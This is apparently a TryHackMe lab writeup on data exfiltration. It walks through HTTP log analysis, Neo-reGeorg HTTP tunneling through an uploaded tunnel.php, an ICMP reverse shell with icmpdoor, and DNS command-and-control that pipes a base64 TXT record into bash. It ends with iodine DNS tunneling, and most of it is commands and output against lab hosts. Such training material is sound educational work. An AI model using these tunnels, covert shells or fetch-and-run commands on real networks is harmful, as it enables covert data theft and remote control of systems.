# Room Information

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Data%20Exfiltration%20Banner.png)

Room link: https://tryhackme.com/room/dataxexfilt

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 09/10/2023

# Room Tasks

## Exfiltrate Using HTTP(S)

### 

```Bash
thm@web-thm:~$ ssh thm@192.168.0.100
thm@192.168.0.101's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content tha
t are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep  5 23:48:55 2023 from 192.168.0.133
To run a command as administrator (user "root"), use "sudo <command
>".
See "man sudo_root" for details.

thm@web-thm:~$ 
```

```Bash
thm@web-thm:~$ sudo ls -ali /var/log/apache2/
total 24
1028090 drwxr-x--- 1 root adm  4096 Jun 20  2022 .
1028089 drwxr-xr-x 1 root root 4096 May 13  2022 ..
1028091 -rw-r--r-- 1 root root  439 Sep  5 21:49 access.log
1028092 -rw-r----- 1 root adm  1400 Sep  5 21:12 error.log
1028093 -rw-r----- 1 root adm     0 May 13  2022 other_vhosts_acces
s.log
```

```Bash
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm: 
192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?fl
ag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.6
8.0"
192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php H
TTP/1.1" 200 395 "-" "curl/7.68.0"
192.168.0.1 - - [20/Jun/2022:06:18:35 +0100] "GET /test.php HTTP/1.
1" 200 195 "-" "curl/7.68.0"
192.168.0.101 - - [05/Sep/2023:21:49:30 +0100] "POST /contact.php H
thm@web-thm:~$ sudo cat /var/log/apache2/error.log
[Mon Jun 20 05:17:07.685620 2022] [mpm_prefork:notice] [pid 23] AH0
0163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operatio
ns
[Mon Jun 20 05:17:07.685673 2022] [core:notice] [pid 23] AH00094: C
ommand line: '/usr/sbin/apache2'
[Mon Jun 20 06:18:25.691061 2022] [core:warn] [pid 8] AH00098: pid 
file /var/run/apache2/apache2.pid overwritten -- Unclean shutdown o
f previous Apache run?
[Mon Jun 20 06:18:25.693080 2022] [mpm_prefork:notice] [pid 8] AH00
163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operation
s
[Mon Jun 20 06:18:25.693102 2022] [core:notice] [pid 8] AH00094: Co
mmand line: '/usr/sbin/apache2 -D FOREGROUND'
[Mon Jun 20 07:02:35.845076 2022] [mpm_prefork:notice] [pid 8] AH00
169: caught SIGTERM, shutting down
[Mon Jun 20 19:01:09.285979 2022] [mpm_prefork:notice] [pid 8] AH00
163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operation
s
[Mon Jun 20 19:01:09.286642 2022] [core:notice] [pid 8] AH00094: Co
mmand line: '/usr/sbin/apache2 -D FOREGROUND'
[Tue Sep 05 21:12:43.977335 2023] [core:warn] [pid 8] AH00098: pid 
file /var/run/apache2/apache2.pid overwritten -- Unclean shutdown o
f previous Apache run?
[Tue Sep 05 21:12:43.979882 2023] [mpm_prefork:notice] [pid 8] AH00
163: Apache/2.4.41 (Ubuntu) configured -- resuming normal operation
s
[Tue Sep 05 21:12:43.979907 2023] [core:notice] [pid 8] AH00094: Co
mmand line: '/usr/sbin/apache2 -D FOREGROUND'
```

```Bash
root@ip-10-10-228-244:~# echo 'VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo=' > tmp.txt
```

```Bash
root@ip-10-10-228-244:~# base64 -d tmp.txt
THM{H77P-G37-15-f0un6}
```

### HTTP Tunneling

```Bash
root@ip-10-10-188-127# cd /opt/Neo-reGeorg
```

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# firefox http://10.10.83.6/uploader
```

![]()

![]()

![]()

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# python3 neoreg.py -k thm -uttp://10.10.83.6/uploader/files/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

+------------------------------------------------------------------------+
```

```Bash
curl --socks5 127.0.0.1:1080 http://172.20.0.120
<p><a href="/flag">Get Your Flag!</a></p>
```

```Bash
root@ip-10-10-188-127:~# curl --socks5 127.0.0.1:1080 http://172.20.0.120/flag
<p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}</p>
```

## Exfiltration Using ICMP

```Bash
thm@jump-box:~$ tmux
```

```Bash
thm@jump-box:~$
[0] 0:bash  1:bash
```

```Bash
thm@jump-box:~$
[0] 0:bash 
```

```Bash
thm@jump-box:~$ ssh thm@192.168.0.121
thm@192.168.0.121's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content tha
t are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Sep  6 02:23:58 2023 from 192.168.0.133
thm@icmp-host:~$
```

```Bash
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
[sudo] password for thm:

```

`CTRL-B C`
```Bash
thm@jump-box:~$
[0] 0:bash  1:bash
```

```Bash
thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121 
[sudo] password for thm: 
shell:
```

```Bash
shell: whoami
whoami
shell: root
```

```Bash
shell: getFlag
"getFlag"
shell: [+] Check the flag: /tmp/flag.txt
```

`CTRL-B N`
`CTRL-C`
```Bash
thm@icmp-host:~$ ls /tmp
_MEI0IYd3R   flag.txt
```

```Bash
shell: cat /tmp/flag.txt
cat /tmp/flag.txt
shell: THM{g0t-1cmp-p4k3t!}
```

## Exfiltration Over DNS

```Bash
root@ip-10-10-204-26:~# touch /tmp/payload.sh
```

```Bash
root@ip-10-10-204-26:~# vim /tmp/payload.sh 
```

![]()

![]()

```Bash
root@ip-10-10-204-26:~# cat /tmp/payload.sh | base64
IyFiaW4vYmFzaApwaW5nIC1jIDEgdGVzdC50aG0uY29tCg==
```

```Bash
root@ip-10-10-204-26:~# firefox http://10.10.190.252/
```

![]()

![]()

![]()

![]()

```Bash
thm@jump-box:~$ ssh thm@victim2.thm.com
thm@victim2.thm.com's password:
thm@victim2:~$ 
```

```Bash
thm@victim2:~$ dig +short -t TXT flag.tunnel.com | tr -d "\"" | bas
e64 -d | bash
PING test.thm.com (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 m
s

--- test.thm.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}
```

## DNS Tunneling

```Bash
thm@attacker:~$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com  
[sudo] password for <USER>****
Opened dns0
Setting IP of dns0 to <IP ADDRESS>
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com
```

```Bash
thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
[sudo] password for <USER>: 
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for att.tunnel.com to 127.0.0.11
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #0
Setting IP of dns0 to 172.20.0.200	
Setting MTU of dns0 to 1130
Server tunnel IP is 172.20.0.200	
Testing raw UDP data to the server (skip with -r)
Server is at <MACHINE IP>, trying raw login: OK
Sending raw traffic directly to 172.20.0.200	
Connection setup complete, transmitting data.
Detaching from terminal...
```

```Bash
thm@jump-box:~$ ssh thm@172.20.0.200
thm@172.20.0.200's password:
[...]
thm@attacker:~$
```

```Bash
thm@attacker:~$ ssh thm@10.1.1.2 -4 -f -N -D 1080
The authenticity of host '10.1.1.2 (10.1.1.2)' can't be established.
ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.1.1.2' (ECDSA) to the list of known hosts.
thm@10.1.1.2's password:
thm@attacker:~$ 
```

```Bash
thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php

<p>THM{DN5-Tunn311n9-1s-c00l}</p>
```

